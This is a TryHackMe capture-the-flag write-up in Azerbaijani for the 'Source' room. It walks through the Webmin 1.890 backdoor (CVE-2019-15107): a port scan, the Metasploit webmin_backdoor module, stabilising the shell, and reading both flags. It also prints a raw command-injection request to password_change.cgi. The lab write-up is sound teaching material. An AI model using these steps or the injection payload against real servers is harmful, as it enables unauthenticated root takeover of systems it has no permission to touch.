# TryHackMe — Source | Writeup (Azərbaycanca)

> **Çətinlik:** Asan  
> **Əməliyyat Sistemi:** Linux  
> **Kateqoriya:** CVE İstismarı / Boot2Root  
> **Mövzular:** Nmap, Webmin, Metasploit, CVE-2019-15107  
> **Məqsəd:** `user.txt` və `root.txt` bayraqlarını tapmaq

---

## Xülasə

Bu otaqda hədəf sistemdə quraşdırılmış **Webmin 1.890** veb idarəetmə panelinə qarşı **CVE-2019-15107** boşluğundan istifadə edirik. Bu boşluq 2018-ci ildə Webmin-in qurma serverinə həyata keçirilən **təchizat zənciri hücumu (supply chain attack)** nəticəsində yaranmış bir **arxa qapı (backdoor)**-dur. Boşluq autentifikasiya tələb etmədən birbaşa **root** hüququ ilə uzaqdan kod icrasına (RCE) imkan verir. Metasploit vasitəsilə exploiti işlədib root shell əldə edirik.

---

## 1. Kəşfiyyat (Enumeration)

### Nmap Skanı

Hədəf maşında açıq portları aşkar etmək üçün nmap skanı aparırıq:

```bash
nmap -sV -sC -p- <HEDEF_IP>
```

**Alternativ — RustScan (daha sürətli):**

```bash
rustscan -a <HEDEF_IP> -b 65535 -- -A
```

**Nəticə:**

| Port  | Protokol | Xidmət  | Versiya                        |
|-------|----------|---------|--------------------------------|
| 22    | TCP      | SSH     | OpenSSH 7.6p1 Ubuntu           |
| 10000 | TCP      | HTTP    | MiniServ 1.890 (Webmin httpd)  |

İki açıq port aşkar edildi:

- **SSH (22)** — hələlik etimadnamə yoxdur
- **Port 10000** — **Webmin** veb idarəetmə paneli işləyir (versiya: **1.890**)

---

## 2. Webmin Panelinə Baxış

`http://<HEDEF_IP>:10000` ünvanına daxil olmağa çalışırıq. Brauzer xəta göstərir:

```
Error - This web server is running in SSL mode.
```

HTTP əvəzinə **HTTPS** istifadə etməliyik:

```
https://<HEDEF_IP>:10000
```

Bu dəfə **Webmin giriş səhifəsi** açılır. Varsayılan etimadnamələri sınayırıq (`admin:admin`, `root:root`, `admin:password`) — **heç biri işləmir**.

Gobuster ilə qovluq taraması aparırıq, lakin əhəmiyyətli bir nəticə əldə etmirik. Diqqəti versiya məlumatına yönəldirik: **MiniServ 1.890**.

---

## 3. Zəifliyin Araşdırılması

### CVE-2019-15107 — Webmin Backdoor

Webmin 1.890 versiyası üçün exploit axtarırıq:

```bash
searchsploit webmin 1.890
```

**Çıxış:**

```
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit) | linux/webapps/47330.rb
```

**Boşluq haqqında:**

> 2018-ci ilin aprelində naməlum hücumçular Webmin-in qurma serverinə daxil olaraq `password_change.cgi` skriptinə zərərli kod (Perl `qx` operatoru) əlavə etdi. Faylın tarix damğası geri qoyulduğundan bu dəyişiklik Git diff-lərində görünmədi. Bu arxa qapı **1.890 buraxılışına** daxil edildi.

**Texniki detallar:**

- **CVE:** CVE-2019-15107
- **Növ:** Uzaqdan Kod İcrası (RCE) — Autentifikasiyasız
- **Hücum vektoru:** HTTPS, `password_change.cgi` endpoint-i
- **Səbəb:** `old` parametri sanitasiya edilmədən birbaşa shell əmrinə ötürülür
- **Versiya 1.890** — default qurulumda istismar edilə bilər (digər versiyalar üçün "expired password changing" funksiyasının aktiv olması lazımdır)
- **Təsir:** Root hüquqlarıyla ixtiyari əmr icrası

---

## 4. Metasploit ilə İstismar

Metasploit konsolunu açırıq:

```bash
msfconsole
```

Webmin backdoor exploitini axtarırıq:

```bash
msf6 > search webmin backdoor
```

Nəticələrdən uyğun modulu seçirik:

```bash
msf6 > use exploit/linux/http/webmin_backdoor
```

Və ya versiyaya görə axtarırıq:

```bash
msf6 > search 1.920
msf6 > use 0   # (yalnız bir nəticə çıxır)
```

Mövcud parametrləri görürük:

```bash
msf6 exploit(...) > show options
```

Lazımi dəyərləri təyin edirik:

```bash
msf6 exploit(...) > set RHOSTS <HEDEF_IP>
msf6 exploit(...) > set LHOST <OZ_IP>
msf6 exploit(...) > set RPORT 10000
msf6 exploit(...) > set SSL true
```

Exploiti işlədirik:

```bash
msf6 exploit(...) > run
```

**Nəticə:** Birbaşa **root** shell əldə edirik! Hər hansı privilege escalation addımına ehtiyac yoxdur — sistem artıq bizdədir.

---

## 5. Shell Sabitləşdirilməsi

Əldə etdiyimiz shell-i daha rahat istifadə etmək üçün tam interaktiv TTY-a çeviririk:

```bash
python -c "import pty; pty.spawn('/bin/bash');"
```

və ya Python 3 ilə:

```bash
python3 -c "import pty; pty.spawn('/bin/bash');"
```

Kim olduğumuzu yoxlayırıq:

```bash
whoami
# root
```

---

## 6. Bayraqların Tapılması

### user.txt

Ev qovluqlarını yoxlayırıq. Sistemdə `dark` adlı bir istifadəçi var:

```bash
ls /home/
# dark

cat /home/dark/user.txt
```

🚩 **User bayrağı əldə edildi!**

### root.txt

Root-un ev qovluğuna gedirik:

```bash
cat /root/root.txt
```

🚩 **Root bayrağı əldə edildi!**

---

## Hücum Yolu Xülasəsi

```
Nmap skanı
    └─► Port 10000 → MiniServ 1.890 (Webmin httpd)
            └─► searchsploit → CVE-2019-15107 aşkarlandı
                    └─► Metasploit: exploit/linux/http/webmin_backdoor
                            └─► SSL=true, RHOSTS, LHOST təyin edildi
                                    └─► run → ROOT SHELL 🎯
                                            ├─► /home/dark/user.txt 🚩
                                            └─► /root/root.txt 🚩
```

---

## Boşluğun Texniki İzahı

Bu boşluq klassik bir **supply chain attack** nümunəsidir:

```
[Hücumçu] → Webmin build serverinə daxil olur
         → password_change.cgi faylına arxa qapı əlavə edir
         → Faylın tarix damğasını geri qoyur (Git diff-də görünmür)
         → Rəsmi saytdan yüklənən 1.890 paketinə daxil edilir
         → İstifadəçilər zərərli versiyanı quraşdırır

[Hücumçu] HTTP isteği:
POST /password_change.cgi
old=<KOD>|id&user=root&new1=x&new2=x

Webmin bu "old" parametrini sanitasiya etmədən
shell əmri kimi icra edir → root hüquqları ilə RCE
```

---

## İstifadə Edilən Alətlər

| Alət          | Məqsəd                                      |
|---------------|---------------------------------------------|
| `nmap`        | Port skanı və xidmət versiyası aşkarlanması |
| `rustscan`    | Sürətli port skanı (alternativ)             |
| `searchsploit`| Exploit Database-də zəiflik axtarışı        |
| `msfconsole`  | Metasploit Framework — exploit icrası       |
| `python`      | Shell sabitləşdirmə (PTY spawn)             |

---

## Öyrənilənlər

- **Supply chain attack** — proqram təminatının özünün deyil, onun qurma/paylama infrastrukturunun hədəf alınması
- **Versiya məlumatı** hər zaman CVE axtarışında ilk başlanğıc nöqtəsidir
- **Webmin** kimi güclü admin panelləri düzgün konfiqurasiya edilməsə ciddi risk yaradır
- **CVE-2019-15107** — autentifikasiyasız root RCE: ən yüksək səviyyəli kritik boşluqlardan biridir
- `searchsploit` ilə Metasploit birlikdə istifadə edilərkən exploit tapmaq çox sürətli olur
- **SSL=true** parametrini unutmamaq — HTTPS üzərindən işləyən xidmətlər üçün vacibdir

---

*Writeup hazırlandı: TryHackMe — Source (Easy)*
